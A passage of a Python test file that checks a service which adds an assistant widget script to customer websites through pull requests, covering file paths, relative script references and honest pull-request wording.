            framework_skill_id="generic-html",
            widget_target_path=target,
            existing_target_content="<html><body></body></html>\n",
        )


@pytest.mark.asyncio
async def test_a_src_layout_run_reaches_a_pull_request(client: AsyncClient) -> None:
    """End to end on the layout shape that previously produced a non-building pull request."""
    token, _, org_id = await register_user(client, "srclayout@example.com", "SrcLayout")
    hdr = {"Authorization": f"Bearer {token}"}
    project_id = await create_project(client, token, org_id, "src-proj")

    mock = MockGitProvider()
    mock.add_repository("acme", "site")
    mock.add_file("acme", "site", SRC_LAYOUT_TARGET, REACT_LAYOUT)
    set_git_provider(mock)

    await client.post(
        f"/api/v1/organizations/{org_id}/projects/{project_id}/website-integrations",
        headers=hdr,
        json={
            "repository_owner": "acme",
            "repository_name": "site",
            "widget_target_path": SRC_LAYOUT_TARGET,
        },
    )
    run = await client.post(
        f"/api/v1/organizations/{org_id}/projects/{project_id}/website-integrations/runs",
        headers=hdr,
    )
    assert run.status_code == 201, run.text
    assert run.json()["status"] == "PR_CREATED"

    committed = {
        path
        for (owner, repo, _branch), tree in mock.commits.items()
        for path in tree
        if owner == "acme" and repo == "site"
    } if hasattr(mock, "commits") else set()
    if committed:
        assert "src/components/fussion/FussionAssistant.tsx" in committed


def test_html_and_htm_targets_are_both_patched_in_place() -> None:
    """`.htm` is a real HTML file; the old code silently substituted `index.html` for it."""
    from app.services.integration.artifacts import generate_artifacts

    for target, script in (
        ("public/index.htm", "public/fussion-assistant.js"),
        ("index.HTML", "fussion-assistant.js"),
        ("docs/index.html", "docs/fussion-assistant.js"),
    ):
        files = generate_artifacts(
            project_id=uuid.uuid4(),
            assistant_data={"name": "Acme", "is_enabled": True},
            framework_skill_id="generic-html",
            widget_target_path=target,
            existing_target_content="<html><body></body></html>\n",
        )
        # The script sits beside the page and is referenced relatively. An absolute
        # `/fussion-assistant.js` 404s on the customer's live site whenever the page is not served
        # from the repository root — Vite's public/, GitHub Pages' docs/, any project site.
        assert set(files) == {script, target}, target
        assert 'src="./fussion-assistant.js"' in files[target], target


def test_the_static_script_is_reachable_from_the_page_that_loads_it() -> None:
    from app.services.integration.artifacts import generate_artifacts
    from app.services.integration.planner import IntegrationPlanner

    target = "public/index.html"
    files = generate_artifacts(
        project_id=uuid.uuid4(),
        assistant_data={"name": "Acme", "is_enabled": True},
        framework_skill_id="generic-html",
        widget_target_path=target,
        existing_target_content="<html><body></body></html>\n",
    )
    plan = IntegrationPlanner.generate_plan(
        framework_skill_id="generic-html",
        widget_target_path=target,
        assistant_data={"is_enabled": True},
        has_knowledge_base=True,
        target_status="exists",
    )

    # Plan and generator agree, and the src resolves to a file that was actually written.
    assert set(files) == set(plan.files_to_create + plan.files_to_modify)
    resolved = posixpath.normpath(posixpath.join(posixpath.dirname(target), "./fussion-assistant.js"))
    assert resolved in files


@pytest.mark.asyncio
async def test_the_pull_request_body_does_not_claim_a_build_it_never_ran(client: AsyncClient) -> None:
    """AGENT-ARCHITECTURE §11: approval must be real. FEASIBILITY §4 asks for this wording."""
    token, _, org_id = await register_user(client, "prbody@example.com", "PrBody")
    hdr = {"Authorization": f"Bearer {token}"}
    project_id = await create_project(client, token, org_id, "prbody-proj")

    mock = MockGitProvider()
    mock.add_repository("acme", "site")
    mock.add_file("acme", "site", "app/layout.tsx", REACT_LAYOUT)
    set_git_provider(mock)

    await client.post(
        f"/api/v1/organizations/{org_id}/projects/{project_id}/website-integrations",
        headers=hdr,
        json={"repository_owner": "acme", "repository_name": "site", "widget_target_path": "app/layout.tsx"},
    )
    run = await client.post(
        f"/api/v1/organizations/{org_id}/projects/{project_id}/website-integrations/runs",
        headers=hdr,
    )
    assert run.status_code == 201, run.text

    body = next(iter(mock.pull_requests.values()))["body"]
    assert "Sandbox validation" not in body
    assert "did not install dependencies, type-check, or build" in body
    assert "Phase 11" not in body
